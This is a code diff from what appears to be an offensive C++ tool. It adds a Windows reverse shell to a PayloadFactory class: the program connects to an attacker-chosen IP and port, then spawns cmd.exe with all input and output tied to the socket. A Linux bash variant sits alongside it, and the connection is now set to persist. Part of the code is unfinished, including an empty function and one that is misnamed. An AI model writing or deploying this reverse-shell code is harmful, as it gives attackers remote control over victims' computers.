@@ -32,13 +32,15 @@ PayloadFactory::~PayloadFactory(){
 //reverse shell initalizer
 bool PayloadFactory::temReverseShell(){
     victim->setConnectedServerConfig(rsIP.c_str(),rsPortNo);
-    victim->setClientConnection(CSOCK_ONCE);
+    victim->setClientConnection(CSOCK_STAY);
     bool connectionStatus = victim->connectServer();
 
     if(!connectionStatus)
         return false;
+    
+    DEBUG(444);
 
-    if(targetSystem == TARGET_LINUX){
+    #ifdef TEM_HOST_IS_UNIX
         const char *shellPath = "/bin/bash";
         char *const argv[] = {"/bin/bash","-i",NULL}; //bash=argc1 , params -i terminal_mode ,null delimeter
         char *const envp[] = {NULL};
@@ -56,15 +58,73 @@ bool PayloadFactory::temReverseShell(){
         Replace the current process, executing PATH with arguments ARGV and
         environment ENVP. ARGV and ENVP are terminated by NULL pointers.
         File: unistd.h
-        */
-        
-    }
-    else if(targetSystem == TARGET_WINDOWS){
-
-        std::cout << "not defined" << "\n";
-
-    }    
+        */   
+    
     return true;
+    #endif //TEM_HOST_IS_UNIX
+
+
+    #ifdef TEM_HOST_IS_WIN32
+    
+
+
+        PROCESS_INFORMATION processConfig;                          //process baslatirken config yapmak icin struct
+        STARTUPINFO startupConfig;                                  //processin x,y , xsize , ysize ... configi
+        memset(&startupConfig,0,sizeof(startupConfig));
+        
+        startupConfig.cb = sizeof(startupConfig);                   //count of bytes erisimleri memory safe hale getirme
+        startupConfig.dwFlags = STARTF_USESTDHANDLES;               //The hStdInput, hStdOutput, and hStdError members contain additional information
+        startupConfig.hStdInput = startupConfig.hStdOutput = startupConfig.hStdError = (HANDLE) victim->getSocketFD();
+        DEBUG(555);
+
+        if (!CreateProcess(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startupConfig, &processConfig)) {
+            std::cerr << "CreateProcess failed! Error: " << GetLastError() << std::endl;
+            return false;
+        }
+        
+
+
+        /* msdn kaynak : https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
+        typedef struct _PROCESS_INFORMATION {
+            HANDLE hProcess;
+            HANDLE hThread;
+            DWORD  dwProcessId;
+            DWORD  dwThreadId;
+        } PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;
+        */
+
+        /* msdn kaynak : https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
+        typedef struct _STARTUPINFOA {
+            DWORD  cb;                                                      -------------> count of bytes
+            LPSTR  lpReserved;
+            LPSTR  lpDesktop;
+            LPSTR  lpTitle;
+            DWORD  dwX;
+            DWORD  dwY;
+            DWORD  dwXSize;
+            DWORD  dwYSize;
+            DWORD  dwXCountChars;
+            DWORD  dwYCountChars;
+            DWORD  dwFillAttribute;
+            DWORD  dwFlags;                                                 -------------> double word flags
+            WORD   wShowWindow;
+            WORD   cbReserved2;
+            LPBYTE lpReserved2;
+            HANDLE hStdInput;
+            HANDLE hStdOutput;
+            HANDLE hStdError;
+        } STARTUPINFOA, *LPSTARTUPINFOA;
+        
+        */
+
+       /* WIN32 API SOYUTLAMALAR
+        typedef unsigned long DWORD
+        HANDLE -> PHANDLE -> void*
+       
+       */
+
+    return true;
+    #endif //TEM_HOST_IS_WIN32
 }
 
 void PayloadFactory::setIP_Port(const std::string &rsIP,uint rsPort){
@@ -93,4 +153,12 @@ bool PayloadFactory::createPayloadRuntime(const std::string payload_name ,std::v
 
 bool PayloadFactory::createPayloadExecutable(std::string &payload_name , std::vector<std::string> &args,std::string &outputPath){
 
+}
+
+
+bool PayloadFactorytemStartProcessWithSocket(){
+    #ifdef TEM_HOST_IS_WIN32
+        
+
+    #endif 
 }
